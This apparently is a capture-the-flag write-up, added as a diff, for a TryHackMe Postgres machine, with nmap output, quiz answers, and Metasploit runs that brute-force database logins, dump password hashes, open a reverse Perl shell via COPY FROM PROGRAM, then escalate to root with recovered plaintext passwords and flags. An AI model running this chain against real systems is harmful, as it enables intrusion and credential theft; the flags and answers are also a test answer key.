@@ -1,0 +1,350 @@
+IP:  10.10.105.134
+
+Nmap scan results:
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/rdbms# nmap -A -T4  10.10.105.134
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-20 11:22 IST
+Nmap scan report for 10.10.105.134
+Host is up (0.15s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
+|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
+|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
+80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Poster CMS
+5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10
+| ssl-cert: Subject: commonName=ubuntu
+| Not valid before: 2020-07-29T00:54:25
+|_Not valid after:  2030-07-27T00:54:25
+|_ssl-date: TLS randomness does not represent time
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/20%OT=22%CT=1%CU=38587%PV=Y%DS=2%DC=T%G=Y%TM=5FB759
+OS:B0%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OP
+OS:S(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST
+OS:11NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
+OS:N(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+
+1) What is the rdbms installed on the server?
+-> postgresql
+
+2) What port is the rdbms running on?
+-> 5432
+
+msf6 > search postgresql
+
+Matching Modules
+================
+
+   #   Name                                                        Disclosure Date  Rank       Check  Description
+   -   ----                                                        ---------------  ----       -----  -----------
+   0   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
+   1   auxiliary/admin/http/rails_devise_pass_reset                2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
+   2   auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query
+   3   auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query
+   4   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     No     PostgreSQL Database Name Command Line Flag Injection
+   5   auxiliary/scanner/postgres/postgres_login                                    normal     No     PostgreSQL Login Utility
+   6   auxiliary/scanner/postgres/postgres_version                                  normal     No     PostgreSQL Version Probe
+   7   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
+   8   exploit/linux/postgres/postgres_payload                     2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
+   9   exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
+   10  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+   11  exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
+   12  exploit/windows/postgres/postgres_payload                   2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
+   13  post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History
+
+
+
+3) After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?
+-> auxiliary/scanner/postgres/postgres_login
+
+msf6 auxiliary(scanner/postgres/postgres_login) > options
+
+Module options (auxiliary/scanner/postgres/postgres_login):
+
+   Name              Current Setting                                                                            Required  Description
+   ----              ---------------                                                                            --------  -----------
+   BLANK_PASSWORDS   false                                                                                      no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                                          yes       How fast to bruteforce, from 0 to 5
+   DATABASE          template1                                                                                  yes       The database to authenticate against
+   DB_ALL_CREDS      false                                                                                      no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                                      no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                                      no        Add all users in the current database to the list
+   PASSWORD                                                                                                     no        A specific password to authenticate with
+   PASS_FILE         /opt/metasploit-framework/embedded/framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                                      no        A proxy chain of format type:host:port[,type:host:port][...]
+   RETURN_ROWSET     true                                                                                       no        Set to true to see query result sets
+   RHOSTS                                                                                                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT             5432                                                                                       yes       The target port
+   STOP_ON_SUCCESS   false                                                                                      yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                                          yes       The number of concurrent threads (max one per host)
+   USERNAME                                                                                                     no        A specific username to authenticate as
+   USERPASS_FILE     /opt/metasploit-framework/embedded/framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-separated) users and passwords, one pair per line
+   USER_AS_PASS      false                                                                                      no        Try the username as the password for all users
+   USER_FILE         /opt/metasploit-framework/embedded/framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
+   VERBOSE           true                                                                                       yes       Whether to print output for all attempts
+
+msf6 auxiliary(scanner/postgres/postgres_login) > set rhosts  10.10.105.134
+rhosts => 10.10.105.134
+msf6 auxiliary(scanner/postgres/postgres_login) > run
+
+[!] No active DB -- Credential data will not be saved!
+[-] 10.10.105.134:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
+[-] 10.10.105.134:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
+[-] 10.10.105.134:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
+[-] 10.10.105.134:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
+[-] 10.10.105.134:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
+[-] 10.10.105.134:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
+[-] 10.10.105.134:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
+[-] 10.10.105.134:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
+[+] 10.10.105.134:5432 - Login Successful: postgres:password@template1
+
+
+4) What are the credentials you found?
+-> postgress:password
+
+5) What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?
+-> auxiliary/admin/postgres/postgres_sql
+
+msf6 auxiliary(scanner/postgres/postgres_login) > use 3
+omsf6 auxiliary(admin/postgres/postgres_sql) > options
+
+Module options (auxiliary/admin/postgres/postgres_sql):
+
+   Name           Current Setting   Required  Description
+   ----           ---------------   --------  -----------
+   DATABASE       template1         yes       The database to authenticate against
+   PASSWORD       postgres          no        The password for the specified username. Leave blank for a random password.
+   RETURN_ROWSET  true              no        Set to true to see query result sets
+   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT          5432              yes       The target port
+   SQL            select version()  no        The SQL query to execute
+   USERNAME       postgres          yes       The username to authenticate as
+   VERBOSE        false             no        Enable verbose output
+
+msf6 auxiliary(admin/postgres/postgres_sql) > set password password
+password => password
+msf6 auxiliary(admin/postgres/postgres_sql) > run
+[-] Auxiliary failed: Msf::OptionValidateError One or more options failed to validate: RHOSTS.
+msf6 auxiliary(admin/postgres/postgres_sql) > set rhosts 10.10.105.134
+rhosts => 10.10.105.134
+msf6 auxiliary(admin/postgres/postgres_sql) > run
+[*] Running module against 10.10.105.134
+
+Query Text: 'select version()'
+==============================
+
+    version
+    -------
+    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
+
+[*] Auxiliary module execution completed
+
+6) Based on the results of #6, what is the rdbms version installed on the server?
+-> 9.5.21
+
+7) What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?
+-> auxiliary/scanner/postgres/postgres_hashdump
+
+msf6 auxiliary(admin/postgres/postgres_sql) > use 1
+msf6 auxiliary(scanner/postgres/postgres_hashdump) > options
+
+Module options (auxiliary/scanner/postgres/postgres_hashdump):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  postgres         yes       The database to authenticate against
+   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
+   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT     5432             yes       The target port
+   THREADS   1                yes       The number of concurrent threads (max one per host)
+   USERNAME  postgres         yes       The username to authenticate as
+
+msf6 auxiliary(scanner/postgres/postgres_hashdump) > set rhosts 10.10.105.134
+rhosts => 10.10.105.134
+msf6 auxiliary(scanner/postgres/postgres_hashdump) > set password password
+password => password
+msf6 auxiliary(scanner/postgres/postgres_hashdump) > set database template1
+database => template1
+msf6 auxiliary(scanner/postgres/postgres_hashdump) > run
+
+[+] Query appears to have run successfully
+[+] Postgres Server Hashes
+======================
+
+ Username   Hash
+ --------   ----
+ darkstart  md58842b99375db43e9fdf238753623a27d
+ poster     md578fb805c7412ae597b399844a54cce0a
+ postgres   md532e12f215ba27cb750c9e093ce4b5127
+ sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
+ ti         md57af9ac4c593e9e4f275576e13f935579
+ tryhackme  md503aab1165001c8f8ccae31a8824efddc
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+8) How many user hashes does the module dump?
+-> 6
+
+9) What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?
+-> auxiliary/admin/postgres/postgres_readfile
+
+10) What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?
+-> exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+
+sf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > options
+
+Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   DATABASE           template1        yes       The database to authenticate against
+   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (For Debugging)
+   PASSWORD           password         no        The password for the specified username. Leave blank for a random password.
+   RHOSTS                              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT              5432             yes       The target port (TCP)
+   TABLENAME          oh0s8MF7         yes       A table name that does not exist (To avoid deletion)
+   USERNAME           postgres         yes       The username to authenticate as
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.9.81.62       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
+
+[-] Exploit failed: One or more options failed to validate: RHOSTS.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set rhosts 10.10.105.134
+rhosts => 10.10.105.134
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
+
+[*] Started reverse TCP handler on 10.9.81.62:4444
+[*] 10.10.105.134:5432 - 10.10.105.134:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
+[*] 10.10.105.134:5432 - Exploiting...
+[+] 10.10.105.134:5432 - 10.10.105.134:5432 - oh0s8MF7 dropped successfully
+[+] 10.10.105.134:5432 - 10.10.105.134:5432 - oh0s8MF7 created successfully
+[+] 10.10.105.134:5432 - 10.10.105.134:5432 - oh0s8MF7 copied successfully(valid syntax/command)
+[+] 10.10.105.134:5432 - 10.10.105.134:5432 - oh0s8MF7 dropped successfully(Cleaned)
+[*] 10.10.105.134:5432 - Exploit Succeeded
+[*] Command shell session 1 opened (10.9.81.62:4444 -> 10.10.105.134:38280) at 2020-11-20 11:53:36 +0530
+
+
+id
+uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
+
+
+ls -la
+total 16
+drwxr-xr-x  4 root   root   4096 Jul 28 20:13 .
+drwxr-xr-x 22 root   root   4096 Jul 28 17:46 ..
+drwxr-xr-x  4 alison alison 4096 Jul 28 20:26 alison
+drwxr-xr-x  2 dark   dark   4096 Jul 28 20:33 dark
+postgres@ubuntu:/home$ cd dark
+clsd dark
+postgres@ubuntu:/home/dark$  -la
+ls -la
+total 28
+drwxr-xr-x 2 dark dark 4096 Jul 28 20:33 .
+drwxr-xr-x 4 root root 4096 Jul 28 20:13 ..
+-rw------- 1 dark dark   26 Jul 28 20:33 .bash_history
+-rw-r--r-- 1 dark dark  220 Aug 31  2015 .bash_logout
+-rw-r--r-- 1 dark dark 3771 Aug 31  2015 .bashrc
+-rwxrwxrwx 1 dark dark   24 Jul 28 20:15 credentials.txt
+-rw-r--r-- 1 dark dark  655 May 16  2017 .profile
+postgres@ubuntu:/home/dark$ cat cr
+cat credentials.txt
+dark:qwerty1234#!hackme
+
+dark@ubuntu:/var/www/html$ s -la
+ls -la
+total 16
+drwxr-xr-x 3 root   root   4096 Jul 28 20:22 .
+drwxr-xr-x 3 root   root   4096 Jul 28 20:12 ..
+-rwxrwxrwx 1 alison alison  123 Jul 28 21:07 config.php
+drwxr-xr-x 4 alison alison 4096 Jul 28 20:22 poster
+dark@ubuntu:/var/www/html$ cat config.php
+cat config.php
+<?php
+
+        $dbhost = "127.0.0.1";
+        $dbuname = "alison";
+        $dbpass = "p4ssw0rdS3cur3!#";
+        $dbname = "mysudopassword";
+
+
+dark@ubuntu:/var/www/html$ su alison
+su alison
+Password: p4ssw0rdS3cur3!#
+
+alison@ubuntu:/var/www/html$ id
+id
+uid=1000(alison) gid=1000(alison) groups=1000(alison),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+alison@ubuntu:/var/www/html$ cd /home
+cld /home
+alison@ubuntu:/home$ s -la
+ls -la
+total 16
+drwxr-xr-x  4 root   root   4096 Jul 28 20:13 .
+drwxr-xr-x 22 root   root   4096 Jul 28 17:46 ..
+drwxr-xr-x  4 alison alison 4096 Jul 28 20:26 alison
+drwxr-xr-x  2 dark   dark   4096 Jul 28 20:33 dark
+alison@ubuntu:/home$ cd alison
+ccad alison
+alison@ubuntu:~$ t user.txt
+cat user.txt
+THM{postgresql_fa1l_conf1gurat1on}
+
+
+alison@ubuntu:~$ sudo -l
+sudo -l
+[sudo] password for alison: p4ssw0rdS3cur3!#
+
+Matching Defaults entries for alison on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alison may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+alison@ubuntu:~$ sudo bash
+sudo bash
+root@ubuntu:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:~# cd /root
+clsd /root
+root@ubuntu:/root#  -la
+ls -la
+total 24
+drwx------  3 root root 4096 Jul 28 20:32 .
+drwxr-xr-x 22 root root 4096 Jul 28 17:46 ..
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwxr-xr-x  2 root root 4096 Jul 28 18:03 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   49 Jul 28 20:32 root.txt
+root@ubuntu:/root# cat root.txt
+cat root.txt
+THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
